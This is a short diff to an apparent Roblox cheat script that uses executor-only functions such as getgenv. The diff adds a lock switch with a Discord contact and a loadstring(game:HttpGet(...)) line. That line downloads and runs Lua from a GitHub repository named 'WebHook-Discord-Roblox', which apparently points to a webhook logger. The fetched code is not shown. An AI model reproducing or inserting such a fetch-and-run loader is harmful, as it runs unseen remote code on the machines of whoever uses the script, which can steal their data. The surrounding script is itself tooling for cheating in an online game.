@@ -11,6 +11,17 @@ else
     game.Players.LocalPlayer:Kick("Banned | Reason: Cheating")
 end
 
+local allowExecution = true
+
+print("Script Execution is Allowed.")
+
+if not allowExecution then
+    game.Players.LocalPlayer:Kick("Script Execution is Currently Locked. [Dm: peatchXD#6075]")
+    return
+end
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()
+
 ------------------------------------------------------------------------------------------
 
 getgenv().RatingTarget  = 2;
